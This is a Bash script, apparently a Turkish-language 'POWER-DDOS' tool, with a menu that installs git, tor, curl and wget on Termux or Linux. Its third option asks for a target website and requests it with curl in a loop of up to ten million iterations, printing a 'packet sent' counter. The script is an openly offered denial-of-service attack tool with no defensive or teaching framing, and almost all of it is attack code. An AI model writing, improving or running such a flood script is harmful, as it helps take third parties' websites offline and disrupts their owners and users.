#! bin/bash
clear
echo -e '\e[36m
 
░█▀█░█▀█░█▀█░░░█▄█░█▀▀░█▀█░█░█\e[37m
░█▀█░█░█░█▀█░░░█░█░█▀▀░█░█░█░█
░▀░▀░▀░▀░▀░▀░░░▀░▀░▀▀▀░▀░▀░▀▀▀
'
sleep 1.1
echo -e '\e[34mCODED BY SİYAHKURTWOMEN'
sleep 1.1
echo -e '
\e[31m[\e[37m01\e[31m]\e[37mTERMUX İÇİN GEREKSİNİMLER'
sleep 1.1
echo -e '\e[31m[\e[37m02\e[31m]\e[37mLİNUX İÇİN GEREKSİNİMLER'
sleep 1.1
echo -e '\e[31m[\e[37m03\e[31m]\e[37mPOWER-DDOS'
				
sleep 1.1
echo
read -p $'\e[35mSEÇİM YAPINIZ=}\e[37m' secim
					

if [[ $secim == 01 || $secim == 1 ]]; then
clear
echo -e '\e[31mKURULUM BAŞLADI...'
pkg install git -y
pkg install tor -y
pkg install wget -y
pkg install curl -y
echo -e '\e[31mKURULUM BİTTİ...'
sleep 1.1
bash powerddos.sh

elif [[ $secim == 02 || $secim == 2 ]]; then
clear
echo -e '\e[31mKURULUM BAŞLADI...'
echo -e '\e[37m'
sudo apt-get install git -y
sudo apt-get install tor -y
sudo apt-get install curl -y
sudo apt-get install wget -y
echo -e '\e[31mKURULUM BİTTİ...'
sleep 1.1
bash powerddos.sh

elif [[ $secim == 03 || $secim == 3 ]]; then

clear
echo -e '\e[31m
░█▀█░█▀█░█░█░█▀▀░█▀▄░█▀▄░█▀▄░█▀█░█▀▀\e[37m
░█▀▀░█░█░█▄█░█▀▀░█▀▄░█░█░█░█░█░█░▀▀█
░▀░░░▀▀▀░▀░▀░▀▀▀░▀░▀░▀▀░░▀▀░░▀▀▀░▀▀▀
'
sleep 1.1
echo -e '\e[34mSİYAHKURT_WOMEN'
echo			      
echo -e 'CODED BY SİYAHKURT_WOMEN'
echo 							
read -p $'\e[36mHEDEF SİTEYİ YAZINIZ (ÖRN=https://www.google.com) =}\e[37m' hedefweb
				 
web=0
			
while [ $web -lt 10000000 ]; do
	echo -e '\e[31m'
	echo -e PAKET GÖNDERİLDİ = $web
	let web=web+1
	echo -e '\e[37m'
	curl $hedefweb
done

else
	clear
	echo -e '\e[31mHATALI GİRİŞ!'
	sleep 1.1
	bash powerddos.sh
fi
